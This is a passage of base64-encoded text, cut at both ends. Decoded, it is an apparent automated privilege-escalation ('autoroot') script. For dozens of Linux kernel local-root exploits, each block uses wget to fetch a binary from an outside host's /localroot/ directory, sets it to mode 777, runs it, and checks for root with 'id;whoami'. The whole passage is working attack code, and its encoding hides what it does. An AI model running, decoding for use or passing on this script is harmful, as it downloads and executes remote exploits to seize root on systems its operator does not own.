C9sb2NhbHJvb3QvMTUyMDAiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDE1MjAwIik7DQpzeXN0ZW0oIi4vMTUyMDAiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzE2Iik7DQpzeXN0ZW0oImNobW9kIDc3NyAxNiIpOw0Kc3lzdGVtKCIuLzE2Iik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8xNi0xIik7DQpzeXN0ZW0oImNobW9kIDc3NyAxNi0xIik7DQpzeXN0ZW0oIi4vMTYtMSIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMTgiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDE4Iik7DQpzeXN0ZW0oIi4vMTgiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzE4LTUiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDE4LTUiKTsNCnN5c3RlbSgiLi8xOC01Iik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yIik7DQpzeXN0ZW0oImNobW9kIDc3NyAyIik7DQpzeXN0ZW0oIi4vMiIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi0xIik7DQpzeXN0ZW0oImNobW9kIDc3NyAyLTEiKTsNCnN5c3RlbSgiLi8yLTEiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzItNi05LTIwMDUiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDItNi05LTIwMDUiKTsNCnN5c3RlbSgiLi8yLTYtOS0yMDA1Iik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLTYtOS0yMDA2Iik7DQpzeXN0ZW0oImNobW9kIDc3NyAyLTYtOS0yMDA2Iik7DQpzeXN0ZW0oIi4vMi02LTktMjAwNiIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi40LjIxLTIwMDYiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDItNi05LTIwMDYiKTsNCnN5c3RlbSgiLi8yLTYtOS0yMDA2Iik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLjQuMzYuOTIuNi4yNy41IC0gMjAwOCBMb2NhbCByb290Iik7DQpzeXN0ZW0oImNobW9kIDc3NyAyLjQuMzYuOTIuNi4yNy41IC0gMjAwOCBMb2NhbCByb290Iik7DQpzeXN0ZW0oIi4vMi40LjM2LjkyLjYuMjcuNSAtIDIwMDggTG9jYWwgcm9vdCIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjE4LTE2NC0yMDEwIik7DQpzeXN0ZW0oImNobW9kIDc3NyAyLjYuMTgtMTY0LTIwMTAiKTsNCnN5c3RlbSgiLi8yLjYuMTgtMTY0LTIwMTAiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzIuNi4xOC0xOTQiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDIuNi4xOC0xOTQiKTsNCnN5c3RlbSgiLi8yLjYuMTgtMTk0Iik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLjYuMTgtMTk0LjEtMjAxMCIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgMi42LjE4LTE5NC4xLTIwMTAiKTsNCnN5c3RlbSgiLi8yLjYuMTgtMTk0LjEtMjAxMCIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjE4LTE5NC4yLTIwMTAiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDIuNi4xOC0xOTQuMi0yMDEwIik7DQpzeXN0ZW0oIi4vMi42LjE4LTE5NC4yLTIwMTAiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzIuNi4yLWhvb2x5c2hpdCIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgMi42LjItaG9vbHlzaGl0Iik7DQpzeXN0ZW0oIi4vMi42LjItaG9vbHlzaGl0Iik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLjYuMjAiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDIuNi4yMCIpOw0Kc3lzdGVtKCIuLzIuNi4yMCIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjIwLTIiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDIuNi4yMC0yIik7DQpzeXN0ZW0oIi4vMi42LjIwLTIiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCg0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLjYuMjItMjAwOCIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgMi42LjIyLTIwMDgiKTsNCnN5c3RlbSgiLi8yLjYuMjItMjAwOCIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjIyLTYtODZfNjQtMjAwNyIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgMi42LjIyLTYtODZfNjQtMjAwNyIpOw0Kc3lzdGVtKCIuLzIuNi4yMi02LTg2XzY0LTIwMDciKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzIuNi4yMy0yLjYuMjQiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDIuNi4yMy0yLjYuMjQiKTsNCnN5c3RlbSgiLi8yLjYuMjMtMi42LjI0Iik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLjYuMjMtMi42LjI0XzIiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDIuNi4yMy0yLjYuMjRfMiIpOw0Kc3lzdGVtKCIuLzIuNi4yMy0yLjYuMjRfMiIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjIzLTIuNi4yNyIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgMi42LjIzLTIuNi4yNyIpOw0Kc3lzdGVtKCIuLzIuNi4yMy0yLjYuMjciKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzIuNi4yNCIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgMi42LjI0Iik7DQpzeXN0ZW0oIi4vMi42LjI0Iik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLjYuMjcuNy1nZW5lcmkiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDIuNi4yNy43LWdlbmVyaSIpOw0Kc3lzdGVtKCIuLzIuNi4yNy43LWdlbmVyaSIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjI4LTIwMTEiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDIuNi4yOC0yMDExIik7DQpzeXN0ZW0oIi4vMi42LjI4LTIwMTEiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzIuNi4zMi00Ni4xLkJIc21wIik7DQpzeXN0ZW0oImNobW9kIDc3NyAyLjYuMzItNDYuMS5CSHNtcCIpOw0Kc3lzdGVtKCIuLzIuNi4zMi00Ni4xLkJIc21wIik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLjYuNV9ob29seXNoaXQiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDIuNi41X2hvb2x5c2hpdCIpOw0Kc3lzdGVtKCIuLzIuNi41X2hvb2x5c2hpdCIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjYtMzQiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDIuNi42LTM0Iik7DQpzeXN0ZW0oIi4vMi42LjYtMzQiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzIuNi42LTM0X2gwMGx5c2hpdCIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgMi42LjYtMzRfaDAwbHlzaGl0Iik7DQpzeXN0ZW0oIi4vMi42LjYtMzRfaDAwbHlzaGl0Iik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLjYuNl9oMDBseXNoaXQiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDIuNi42X2gwMGx5c2hpdCIpOw0Kc3lzdGVtKCIuLzIuNi42X2gwMGx5c2hpdCIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjdfaDAwbHlzaGl0Iik7DQpzeXN0ZW0oImNobW9kIDc3NyAyLjYuN19oMDBseXNoaXQiKTsNCnN5c3RlbSgiLi8yLjYuN19oMDBseXNoaXQiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzIuNi44LTIwMDguOS02Ny0yMDA4Iik7DQpzeXN0ZW0oImNobW9kIDc3NyAyLjYuOC0yMDA4LjktNjctMjAwOCIpOw0Kc3lzdGVtKCIuLzIuNi44LTIwMDguOS02Ny0yMDA4Iik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLjYuOC01X2gwMGx5c2hpdCIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgMi42LjgtNV9oMDBseXNoaXQiKTsNCnN5c3RlbSgiLi8yLjYuOC01X2gwMGx5c2hpdCIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjhfaDAwbHlzaGl0Iik7DQpzeXN0ZW0oImNobW9kIDc3NyAyLjYuOF9oMDBseXNoaXQiKTsNCnN5c3RlbSgiLi8yLjYuOF9oMDBseXNoaXQiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzIuNi45Iik7DQpzeXN0ZW0oImNobW9kIDc3NyAyLjYuOSIpOw0Kc3lzdGVtKCIuLzIuNi45Iik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLjYuOS0yMDA0Iik7DQpzeXN0ZW0oImNobW9kIDc3NyAyLjYuOS0yMDA0Iik7DQpzeXN0ZW0oIi4vMi42LjktMjAwNCIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjktMjAwOCIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgMi42LjktMjAwOCIpOw0Kc3lzdGVtKCIuLzIuNi45LTIwMDgiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzIuNi45LTM0Iik7DQpzeXN0ZW0oImNobW9kIDc3NyAyLjYuOS0zNCIpOw0Kc3lzdGVtKCIuLzIuNi45LTM0Iik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLjYuOS00Mi4wLjMuRUxzbXAiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDIuNi45LTQyLjAuMy5FTHNtcCIpOw0Kc3lzdGVtKCIuLzIuNi45LTQyLjAuMy5FTHNtcCIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjktNDIuMC4zLkVMc21wLTIwMDYiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDIuNi45LTQyLjAuMy5FTHNtcC0yMDA2Iik7DQpzeXN0ZW0oIi4vMi42LjktNDIuMC4zLkVMc21wLTIwMDYiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzIuNi45LTU1Iik7DQpzeXN0ZW0oImNobW9kIDc3NyAyLjYuOS01NSIpOw0Kc3lzdGVtKCIuLzIuNi45LTU1Iik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLjYuOS01NS0yMDA3LXBydjgiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDIuNi45LTU1LTIwMDctcHJ2OCIpOw0Kc3lzdGVtKCIuLzIuNi45LTU1LTIwMDctcHJ2OCIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjktNTUtMjAwOC1wcnY4Iik7DQpzeXN0ZW0oImNobW9kIDc3NyAyLjYuOS01NS0yMDA4LXBydjgiKTsNCnN5c3RlbSgiLi8yLjYuOS01NS0yMDA4LXBydjgiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzIuNi45LTY3MjAwOCIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgMi42LjktNjcyMDA4Iik7DQpzeXN0ZW0oIi4vMi42LjktNjcyMDA4Iik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLjYuOS4yIik7DQpzeXN0ZW0oImNobW9kIDc3NyAyLjYuOS4yIik7DQpzeXN0ZW0oIi4vMi42LjkuMiIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjkxLTIwMDciKTsNCnN5c3RlbSgiY2htb2QgNzc3IDIuNi45MS0yMDA3Iik7DQpzeXN0ZW0oIi4vMi42LjkxLTIwMDciKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzIwMDciKTsNCnN5c3RlbSgiY2htb2QgNzc3IDIwMDciKTsNCnN5c3RlbSgiLi8yMDA3Iik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yMDA5LWxvY2FsIik7DQpzeXN0ZW0oImNobW9kIDc3NyAyMDA5LWxvY2FsIik7DQpzeXN0ZW0oIi4vMjAwOS1sb2NhbCIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMjAwOS13dW5kZXJiYXIiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDIwMDktd3VuZGVyYmFyIik7DQpzeXN0ZW0oIi4vMjAwOS13dW5kZXJiYXIiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzIxIik7DQpzeXN0ZW0oImNobW9kIDc3NyAyMSIpOw0Kc3lzdGVtKCIuLzIxIik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8zIik7DQpzeXN0ZW0oImNobW9kIDc3NyAzIik7DQpzeXN0ZW0oIi4vMyIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMy40LjYtOS0yMDA3Iik7DQpzeXN0ZW0oImNobW9kIDc3NyAzLjQuNi05LTIwMDciKTsNCnN5c3RlbSgiLi8zLjQuNi05LTIwMDciKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzMxIik7DQpzeXN0ZW0oImNobW9kIDc3NyAzMSIpOw0Kc3lzdGVtKCIuLzMxIik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8zNi1yYzEiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDM2LXJjMSIpOw0Kc3lzdGVtKCIuLzM2LXJjMSIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvNCIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgNCIpOw0Kc3lzdGVtKCIuLzQiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzQ0Iik7DQpzeXN0ZW0oImNobW9kIDc3NyA0NCIpOw0Kc3lzdGVtKCIuLzQ0Iik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC80NyIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgNDciKTsNCnN5c3RlbSgiLi80NyIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvNSIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgNSIpOw0Kc3lzdGVtKCIuLzUiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzUwIik7DQpzeXN0ZW0oImNobW9kIDc3NyA1MCIpOw0Kc3lzdGVtKCIuLzUwIik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC81NCIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgNTQiKTsNCnN5c3RlbSgiLi81NCIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvNiIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgNiIpOw0Kc3lzdGVtKCIuLzYiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzY3Iik7DQpzeXN0ZW0oImNobW9kIDc3NyA2NyIpOw0Kc3lzdGVtKCIuLzY3Iik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC83Iik7DQpzeXN0ZW0oImNobW9kIDc3NyA3Iik7DQpzeXN0ZW0oIi4vNyIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvNy0yIik7DQpzeXN0ZW0oImNobW9kIDc3NyA3LTIiKTsNCnN5c3RlbSgiLi83LTIiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290Lzd4Iik7DQpzeXN0ZW0oImNobW9kIDc3NyA3eCIpOw0Kc3lzdGVtKCIuLzd4Iik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC84Iik7DQpzeXN0ZW0oImNobW9kIDc3NyA4Iik7DQpzeXN0ZW0oIi4vOCIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvOSIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgOSIpOw0Kc3lzdGVtKCIuLzkiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzkwIik7DQpzeXN0ZW0oImNobW9kIDc3NyA5MCIpOw0Kc3lzdGVtKCIuLzkwIik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC85NCIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgOTQiKTsNCnN5c3RlbSgiLi85NCIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvTGludXhfMi42LjEyIik7DQpzeXN0ZW0oImNobW9kIDc3NyBMaW51eF8yLjYuMTIiKTsNCnN5c3RlbSgiLi9MaW51eF8yLjYuMTIiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290L0xpbnV4XzIuNi45LWpvb2x5c2hpdCIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgTGludXhfMi42Ljktam9vbHlzaGl0Iik7DQpzeXN0ZW0oIi4vMi42LjE4LTIwMTEiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290L2FjaWQiKTsNCnN5c3RlbSgiY2htb2QgNzc3IGFjaWQiKTsNCnN5c3RlbSgiLi9hY2lkIik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC9kM3ZpbCIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgZDN2aWwiKTsNCnN5c3RlbSgiLi9kM3ZpbCIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvZXhwMSIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgZXhwMSIpOw0Kc3lzdGVtKCIuL2V4cDEiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290L2V4cDIiKTsNCnN5c3RlbSgiY2htb2QgNzc3IGV4cDIiKTsNCnN5c3RlbSgiLi9leHAyIik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC9leHAzIik7DQpzeXN0ZW0oImNobW9kIDc3NyBleHAzIik7DQpzeXN0ZW0oIi4vZXhwMyIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvZXhwbG9pdCIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgZXhwbG9pdCIpOw0Kc3lzdGVtKCIuL2V4cGxvaXQiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290L2Z1bGwtbmVsc29uIik7DQpzeXN0ZW0oImNobW9kIDc3NyBmdWxsLW5lbHNvbiIpOw0Kc3lzdGVtKCIuL2Z1bGwtbmVsc29uIik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC9nYXlyb3MiKTsNCnN5c3RlbSgiY2htb2QgNzc3IGdheXJvcyIpOw0Kc3lzdGVtKCIuL2dheXJvcyIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvbGVuaXMuc2giKTsNCnN5c3RlbSgiY2htb2QgNzc3IGxlbmlzLnNoIik7DQpzeXN0ZW0oIi4vbGVuaXMuc2giKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290L2xvY2FsLTIuNi45LTIwMDUtMjAwNiIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgbG9jYWwtMi42LjktMjAwNS0yMDA2Iik7DQpzeXN0ZW0oIi4vbG9jYWwtMi42LjktMjAwNS0yMDA2Iik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC9sb2NhbC1yb290LWV4cGxvaXQtZ2F5cm9zIik7DQpzeXN0ZW0oImNobW9kIDc3NyBsb2NhbC1yb290LWV4cGxvaXQtZ2F5cm9zIik7DQpzeXN0ZW0oIi4vbG9jYWwtcm9vdC1leHBsb2l0LWdheXJvcyIpOw0Kc3lzdG